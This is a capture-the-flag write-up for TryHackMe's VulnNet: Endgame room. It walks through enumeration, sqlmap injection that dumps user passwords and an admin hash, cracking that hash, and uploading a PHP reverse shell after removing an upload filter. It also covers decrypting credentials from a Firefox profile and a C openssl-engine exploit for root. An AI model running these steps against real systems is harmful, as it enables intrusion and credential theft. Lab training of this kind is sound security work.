@@ -1,0 +1,538 @@
+██╗   ██╗██╗   ██╗██╗     ███╗   ██╗███╗   ██╗███████╗████████╗       ███████╗███╗   ██╗██████╗  ██████╗  █████╗ ███╗   ███╗███████╗
+██║   ██║██║   ██║██║     ████╗  ██║████╗  ██║██╔════╝╚══██╔══╝██╗    ██╔════╝████╗  ██║██╔══██╗██╔════╝ ██╔══██╗████╗ ████║██╔════╝
+██║   ██║██║   ██║██║     ██╔██╗ ██║██╔██╗ ██║█████╗     ██║   ╚═╝    █████╗  ██╔██╗ ██║██║  ██║██║  ███╗███████║██╔████╔██║█████╗  
+╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║██║╚██╗██║██╔══╝     ██║   ██╗    ██╔══╝  ██║╚██╗██║██║  ██║██║   ██║██╔══██║██║╚██╔╝██║██╔══╝  
+ ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║██║ ╚████║███████╗   ██║   ╚═╝    ███████╗██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║ ╚═╝ ██║███████╗
+  ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝   ╚═╝          ╚══════╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝
+                                      https://tryhackme.com/room/vulnnetendgame
+                                      
+                                      
+                                      
+----First, we need to edit the /etc/hosts file.
+
+{{sudo nano /etc/hosts}}
+
+----Add the machine IP and the domain "vulnnet.thm" to the end of the file and save.
+                                      
+     __                         __                 
+  /\ \ \_ __ ___   __ _ _ __   / _\ ___ __ _ _ __  
+ /  \/ / '_ ` _ \ / _` | '_ \  \ \ / __/ _` | '_ \ 
+/ /\  /| | | | | | (_| | |_) | _\ \ (_| (_| | | | |
+\_\ \/ |_| |_| |_|\__,_| .__/  \__/\___\__,_|_| |_|
+                       |_|                         
+{{nmap -A -T4 [Machine IP}} 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-16 23:32 UTC
+Nmap scan report for 10.10.116.203
+Host is up (0.24s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 bb:2e:e6:cc:79:f4:7d:68:2c:11:bc:4b:63:19:08:af (RSA)
+|   256 80:61:bf:8c:aa:d1:4d:44:68:15:45:33:ed:eb:82:a7 (ECDSA)
+|_  256 87:86:04:e9:e0:c0:60:2a:ab:87:8e:9b:c7:05:35:1c (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+   ___      _               _              __                 
+  / _ \___ | |__  _   _ ___| |_ ___ _ __  / _\ ___ __ _ _ __  
+ / /_\/ _ \| '_ \| | | / __| __/ _ \ '__| \ \ / __/ _` | '_ \ 
+/ /_\\ (_) | |_) | |_| \__ \ ||  __/ |    _\ \ (_| (_| | | | |
+\____/\___/|_.__/ \__,_|___/\__\___|_|    \__/\___\__,_|_| |_|
+                                                              
+{{gobuster dir -u http://vulnnet.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error -x php,txt,html}}
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://vulnnet.thm
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,txt,html
+[+] Timeout:                 10s
+===============================================================
+2022/09/16 23:45:16 Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 4346]
+/images               (Status: 301) [Size: 311] [--> http://vulnnet.thm/images/]
+/css                  (Status: 301) [Size: 308] [--> http://vulnnet.thm/css/]   
+/README.txt           (Status: 200) [Size: 743]                                 
+/js                   (Status: 301) [Size: 307] [--> http://vulnnet.thm/js/]    
+/fonts                (Status: 301) [Size: 310] [--> http://vulnnet.thm/fonts/] 
+
+----None of these lead anywhere. Let's look for subdomains next:
+
+ __    __  __               
+/ / /\ \ \/ _|_   _ ________
+\ \/  \/ / |_| | | |_  /_  /
+ \  /\  /|  _| |_| |/ / / / 
+  \/  \/ |_|  \__,_/___/___|
+                            
+
+{{wfuzz -c -v -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://vulnnet.thm -H "Host:FUZZ.vulnnet.thm" --hw 9}}
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://vulnnet.thm/
+Total requests: 4989
+
+====================================================================================================================================================
+ID           C.Time       Response   Lines      Word     Chars       Server                           Redirect                         Payload                                                                                    
+====================================================================================================================================================
+
+000000037:   0.964s       200        524 L      1406 W   26701 Ch    Apache/2.4.29 (Ubuntu)                                            "shop"                                                                                     
+000000018:   0.613s       200        390 L      1599 W   19316 Ch    Apache/2.4.29 (Ubuntu)                                            "blog"                                                                                     
+000000051:   0.305s       200        0 L        4 W      18 Ch       Apache/2.4.29 (Ubuntu)                                            "api"                                                                                      
+000000689:   0.306s       400        10 L       35 W     301 Ch      Apache/2.4.29 (Ubuntu)                                            "gc._msdcs"                                                                                
+000001219:   5.222s       307        0 L        0 W      0 Ch        Apache/2.4.29 (Ubuntu)           http://admin1.vulnnet.thm/en/    "admin1"                                                                                   
+
+Total time: 0
+Processed Requests: 4989
+Filtered Requests: 4984
+Requests/sec.: 0
+
+----Add each of these to the /etc/hosts file as well. Run Gobuster again against the newly discovered subdomains:
+
+           _           _       _ 
+  __ _  __| |_ __ ___ (_)_ __ / |
+ / _` |/ _` | '_ ` _ \| | '_ \| |
+| (_| | (_| | | | | | | | | | | |
+ \__,_|\__,_|_| |_| |_|_|_| |_|_|
+                                 
+
+{{gobuster dir -u http://admin1.vulnnet.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error -x php,txt,html -t 250}}
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://admin1.vulnnet.thm
+[+] Method:                  GET
+[+] Threads:                 250
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,txt,html
+[+] Timeout:                 10s
+===============================================================
+2022/09/17 00:24:30 Starting gobuster in directory enumeration mode
+===============================================================
+/en                   (Status: 301) [Size: 321] [--> http://admin1.vulnnet.thm/en/]
+/fileadmin            (Status: 301) [Size: 328] [--> http://admin1.vulnnet.thm/fileadmin/]
+/vendor               (Status: 301) [Size: 325] [--> http://admin1.vulnnet.thm/vendor/]   
+/typo3temp            (Status: 301) [Size: 328] [--> http://admin1.vulnnet.thm/typo3temp/]
+/LICENSE.txt          (Status: 200) [Size: 18425] 
+/typo3                (Status: 301) [Size: 324] [--> http://admin1.vulnnet.thm/typo3/] 
+
+----/typo3 leads to a login page. I tried using Burpsuite Intruder to test for SQL injections and got nothing. 
+----Unsure of the version of Typo3 CMS, I still tried this injection on Exploit-DB, also nothing: https://www.exploit-db.com/exploits/9380
+----Using Gobuster on the other subdomains didn't lead to much. 
+
+
+
+ __       _                       
+/ _\ __ _| |_ __ ___   __ _ _ __  
+\ \ / _` | | '_ ` _ \ / _` | '_ \ 
+_\ \ (_| | | | | | | | (_| | |_) |
+\__/\__, |_|_| |_| |_|\__,_| .__/ 
+       |_|                 |_|    
+       
+----I was able to find this in the source code of blog.vulnnet.thm that reads:
+
+getJSON('http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1',  function(err, data) {
+
+----Next, I checked to see if it that endpoint was vulnerable to injections:
+
+{{sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -dbs}}
+
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.6.9#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:18:47 /2022-09-17/
+
+[20:18:47] [INFO] resuming back-end DBMS 'mysql' 
+[20:18:47] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: blog (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: blog=1 AND 5686=5686
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: blog=1 AND (SELECT 3346 FROM (SELECT(SLEEP(5)))WOOR)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: blog=-7454 UNION ALL SELECT CONCAT(0x717a706271,0x594145655a784d436445525171735358474a6549744c4761797371694e6464417447556250626a48,0x716a6a6b71),NULL,NULL-- -
+---
+[20:18:48] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL 5
+[20:18:48] [INFO] fetching database names
+available databases [3]:
+[*] blog
+[*] information_schema
+[*] vn_admin
+
+[20:18:48] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/api.vulnnet.thm'
+
+[*] ending @ 20:18:48 /2022-09-17/
+
+----Let's enumerate futher, starting with vn_admin:
+
+
+{{sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch --dbms=mysql -D vn_admin --tables}}
+
+
+[20:24:47] [INFO] fetching tables for database: 'vn_admin'
+Database: vn_admin
+[48 tables]
++---------------------------------------------+
+| backend_layout                              |
+| be_dashboards                               |
+| be_groups                                   |
+| be_sessions                                 |
+| be_users                                    |
+| cache_adminpanel_requestcache               |
+| cache_adminpanel_requestcache_tags          |
+| cache_hash                                  |
+| cache_hash_tags                             |
+| cache_imagesizes                            |
+| cache_imagesizes_tags                       |
+| cache_pages                                 |
+| cache_pages_tags                            |
+| cache_pagesection                           |
+| cache_pagesection_tags                      |
+| cache_rootline                              |
+| cache_rootline_tags                         |
+| cache_treelist                              |
+| fe_groups                                   |
+| fe_sessions                                 |
+| fe_users                                    |
+| pages                                       |
+| sys_be_shortcuts                            |
+| sys_category                                |
+| sys_category_record_mm                      |
+| sys_collection                              |
+| sys_collection_entries                      |
+| sys_file                                    |
+| sys_file_collection                         |
+| sys_file_metadata                           |
+| sys_file_processedfile                      |
+| sys_file_reference                          |
+| sys_file_storage                            |
+| sys_filemounts                              |
+| sys_history                                 |
+| sys_language                                |
+| sys_lockedrecords                           |
+| sys_log                                     |
+| sys_news                                    |
+| sys_note                                    |
+| sys_redirect                                |
+| sys_refindex                                |
+| sys_registry                                |
+| sys_template                                |
+| tt_content                                  |
+| tx_extensionmanager_domain_model_extension  |
+| tx_extensionmanager_domain_model_repository |
+| tx_impexp_presets                           |
++---------------------------------------------+
+
+[20:24:47] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/api.vulnnet.thm'
+
+[*] ending @ 20:24:47 /2022-09-17/
+
+
+----And enumerate the columns for be_users:
+
+
+{{sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch --dbms=mysql -D vn_admin -T be_users --columns}}
+
+
+[20:26:14] [INFO] fetching columns for table 'be_users' in database 'vn_admin'
+Database: vn_admin
+Table: be_users
+[34 columns]
++-----------------------+----------------------+
+| Column                | Type                 |
++-----------------------+----------------------+
+| admin                 | smallint(5) unsigned |
+| allowed_languages     | varchar(255)         |
+| avatar                | int(10) unsigned     |
+| category_perms        | text                 |
+| crdate                | int(10) unsigned     |
+| createdByAction       | int(11)              |
+| cruser_id             | int(10) unsigned     |
+| db_mountpoints        | text                 |
+| deleted               | smallint(5) unsigned |
+| description           | text                 |
+| disable               | smallint(5) unsigned |
+| disableIPlock         | smallint(5) unsigned |
+| email                 | varchar(255)         |
+| endtime               | int(10) unsigned     |
+| file_mountpoints      | text                 |
+| file_permissions      | text                 |
+| lang                  | varchar(6)           |
+| lastlogin             | int(10) unsigned     |
+| lockToDomain          | varchar(50)          |
+| options               | smallint(5) unsigned |
+| password              | varchar(100)         |
+| pid                   | int(10) unsigned     |
+| realName              | varchar(80)          |
+| starttime             | int(10) unsigned     |
+| TSconfig              | text                 |
+| tstamp                | int(10) unsigned     |
+| uc                    | mediumblob           |
+| uid                   | int(10) unsigned     |
+| usergroup             | varchar(255)         |
+| usergroup_cached_list | text                 |
+| userMods              | text                 |
+| username              | varchar(50)          |
+| workspace_id          | int(11)              |
+| workspace_perms       | smallint(6)          |
++-----------------------+----------------------+
+
+
+----Next, select which columns we would like to see (admin, username, and password):
+
+{{sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch --dbms=mysql -D vn_admin -T be_users -C admin,username,password --dump}}
+
+[20:27:32] [INFO] fetching entries of column(s) 'admin,password,username' for table 'be_users' in database 'vn_admin'
+[20:27:32] [WARNING] reflective value(s) found and filtering out
+Database: vn_admin
+Table: be_users
+[1 entry]
++-------+----------+---------------------------------------------------------------------------------------------------+
+| admin | username | password                                                                                          |
++-------+----------+---------------------------------------------------------------------------------------------------+
+| 1     | chris_w  | $argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg |
++-------+----------+---------------------------------------------------------------------------------------------------+
+
+----The password hash is generated using Argon2, which I was unable to crack.
+----Hold onto this, and poke around the databases some more.
+
+ _     _             
+| |__ | | ___   __ _ 
+| '_ \| |/ _ \ / _` |
+| |_) | | (_) | (_| |
+|_.__/|_|\___/ \__, |
+               |___/ 
+               
+{{sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -dbms=mysql -D blog -T users --columns}}
+
+[20:33:29] [INFO] fetching columns for table 'users' in database 'blog'
+Database: blog
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(11)     |
+| password | varchar(50) |
+| username | varchar(50) |
++----------+-------------+
+               
+
+----There are some columns for more usernames and passwords in the blog database:
+
+
+{{sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -dbms=mysql -D blog -T users -C id,password,username --dump}}
+
+[20:33:54] [INFO] fetching entries of column(s) 'id,password,username' for table 'users' in database 'blog'
+Database: blog
+Table: users
+[651 entries]
++-----+---------------------+--------------------+
+| id  | password            | username           |
++-----+---------------------+--------------------+
+[20:33:54] [WARNING] console output will be trimmed to last 256 rows due to large table size
+| 396 | D8Gbl8mnxg          | lspikinsaz         |
+| 397 | kLLxorKfd           | profeb0            |
+| 398 | cdXAJAR             | sberrymanb1        |
+| 399 | 0hdeFiZBRJ          | ajefferiesb2       |
+| 400 | 6rl6qXSJDrr         | hkibblewhiteb3     |
+| 401 | DuYMuI              | dtremayneb4        |
+
+
+
+----There is a huge list here, which all seems very random. However, we can use this to create a wordlist to (hopefully) crack the admin password from before.
+----Dump just the password column:
+
+{{sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -dbms=mysql -D blog -T users -C password --dump}}
+
+----The list will be saved (on Kali) under /home/kali/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/
+----I tried to use Hydra against the login page, but only got false positives (so it wasn't executing properly... probably my own fault).
+----Burpsuite Intruder is another option. I ran that in the background and then decided to try just cracking the hash with John while that was going.
+
+{{john --wordlist=[the dumped password list].txt [chris_w's hash].hash}}
+ 
+Using default input encoding: UTF-8
+Loaded 1 password hash (argon2 [Blake2 AVX])
+Cost 1 (t) is 16 for all loaded hashes
+Cost 2 (m) is 65536 for all loaded hashes
+Cost 3 (p) is 2 for all loaded hashes
+Cost 4 (type [0:Argon2d 1:Argon2i]) is 1 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+{{REDACTEDx}}      (?)     
+1g 0:00:03:02 DONE (2022-09-17 21:44) 0.005489g/s 3.161p/s 3.161c/s 3.161C/s mRKzfwcmKqp..wmd4CD60
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+----This is the answer to Question 1----
+
+     _           _     _                         _ 
+  __| | __ _ ___| |__ | |__   ___   __ _ _ __ __| |
+ / _` |/ _` / __| '_ \| '_ \ / _ \ / _` | '__/ _` |
+| (_| | (_| \__ \ | | | |_) | (_) | (_| | | | (_| |
+ \__,_|\__,_|___/_| |_|_.__/ \___/ \__,_|_|  \__,_|
+                                                   
+----Logging in with the newly discovered credentials, we are presented with a dashboard. 
+----I go to the User settings, and wonder if I can get a reverse shell through the avatar.
+----I try a reverse php shell first, and I get this warning: Extension of file name "reverse.php" is not allowed in "/user_upload/"!
+----So, I figure we try different extensions and see if any go through. I successfully get the shell through with using ".php1" but it does not execute when you go to /fileadmin/user_upload/[shell].php1
+----There is probably another filter going on (that is just my guess) or the extension is messing it up for some reason. I looked through configurations and settings on the dashboard until I found under Admin Tools - Settings - Configure Installation-Wide Options: [BE][fileDenyPattern] 
+----It confirms that PHP 1 and 2 both got through the filter, but let's just delete the regex below and try a regular .php shell.
+----Save it, upload the shell, start a listener, and visit your newly uploaded file in /fileadmin/user_upload.
+
+
+                           _        _   
+ _   _ ___  ___ _ __      | |___  _| |_ 
+| | | / __|/ _ \ '__|     | __\ \/ / __|
+| |_| \__ \  __/ |     _  | |_ >  <| |_ 
+ \__,_|___/\___|_|    (_)  \__/_/\_\\__|
+                                        
+----Going around the system, I see that the only user on there is called system (which, oddly their home directory structure looks like it came from a windows machine).
+----Trying to read user.txt in /home/system/ gives us a permission denied.
+----Searched for files with SUID set, nothing. Continued looking around the system for anything. 
+----Back in /home/system/, there is a .mozilla file that we can potentially extract credentials from.
+
+
+
+----Catting out /home/system/.mozilla/firefox/2fjnrwth.default-release gives us this:
+
+{"nextId":2,"logins":[{"id":1,"hostname":"https://tryhackme.com","httpRealm":null,"formSubmitURL":"https://tryhackme.com","usernameField":"email","passwordField":"password","encryptedUsername":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECGTdteVlY+xxBBjfIPYRG22oqSkatzSobyWk2xPX4TiOOKE=","encryptedPassword":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECHu6efDMbAwDBBjp+XbxLGvfpavdVwdpPFupNpNwheQ+A5Y=","guid":"{8fa24ee9-208e-41f9-a718-eb6a770d70b8}","encType":1,"timeCreated":1654970290415,"timeLastUsed":1654970290415,"timePasswordChanged":1654970290415,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
+
+----An encrypted username and password
+----First, we need to get the file onto our system. I moved the directory to /var/www/admin1/fileadmin/user_upload/ so I could access it quickly
+
+{{cp -r .mozilla /var/www/admin1/fileadmin/user_upload/thisone}}
+
+----And then I downloaded it to my computer using this command I found on superuser.com lol:
+
+{{wget -r -np -nH --cut-dirs=3 -R index.html http://admin1.vulnnet.thm/fileadmin/user_upload/thisone}}
+
+----Next, we will use a tool called Firefox Decrypt to help us get the credentials. 
+----Get it from here: https://github.com/unode/firefox_decrypt
+
+{{git clone https://github.com/unode/firefox_decrypt.git}}
+
+----Change one of the paths in profiles.ini to reflect the one we want to crack (which is 2fjnrwth.default-release)
+
+[Profile0]
+Name=default-release
+IsRelative=1
+Path=2fjnrwth.default-release
+
+----Navigate to the Firefox_Decrypt folder, and run it:
+
+{{python3 firefox_decrypt.py ../firefox/}}
+            
+Select the Mozilla profile you wish to decrypt
+1 -> 2o9vd4oi.default
+2 -> 2fjnrwth.default-release
+2
+
+Website:   https://tryhackme.com
+Username: 'chris_w@vulnnet.thm'
+Password: '{{REDACTED}}'
+
+
+
+----Lucky for us, this is the password to the user system, and we can ssh into the machine with these credentials
+
+{{ssh system@[machine IP]}}
+
+----user.txt is in /home/system/
+
+
+
+                 _         _            _   
+ _ __ ___   ___ | |_      | |_ _____  _| |_ 
+| '__/ _ \ / _ \| __|     | __/ _ \ \/ / __|
+| | | (_) | (_) | |_   _  | ||  __/>  <| |_ 
+|_|  \___/ \___/ \__| (_)  \__\___/_/\_\\__|
+                                            
+
+----sudo -l tells us that we may not run sudo as the current user.
+----Nothing in crontab.
+----I already tried looking for files with SUID set earlier.
+----How about capabilities?
+
+{{getcap -r / 2>/dev/null}}
+
+/home/system/Utils/openssl =ep
+/snap/core20/1081/usr/bin/ping = cap_net_raw+ep
+/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+
+----openssl may be leveraged to exploit the machine further.
+----I followed the instructions here in order to do so: https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/
+
+1. Requirements (On Your System)
+
+    We will use #include <openssl/engine.h> header in our exploit engine file. On debian based systems, use: sudo apt-get install libssl-dev to install.
+    gcc
+
+2. Getting The Exploit Ready
+
+Create a file named openssl-exploit-engine.c with contents as such:
+
+#include <openssl/engine.h>
+
+static int bind(ENGINE *e, const char *id)
+{
+  setuid(0); setgid(0);
+  system("/bin/bash");
+}
+
+IMPLEMENT_DYNAMIC_BIND_FN(bind)
+IMPLEMENT_DYNAMIC_CHECK_FN()   
+
+Check the [2] reference for more information.
+3. Compiling
+
+Run the following:
+
+    gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c
+    gcc -shared -o openssl-exploit-engine.so -lcrypto openssl-exploit-engine.o
+
+
+Using python3’s http server, and wget or curl on the target machine, we can transfer the file.
+
+    [on your machine] start up python3 server in the directory where you have the file, as such: sudo python3 -m http.server 80. this starts the server on port 80.
+    [on target machine] use wget or curl the file as such: wget YOUR_RELEVANT_IP/openssl-exploit-engine.so
+
+
+----After going through these instructions, make the exploit executable with chmod +x, and use this command:
+
+{{/home/system/Utils/openssl req -engine ./openssl-exploit-engine.so}} 
+
+Congrats!! root.txt is in /root/thm-flag/
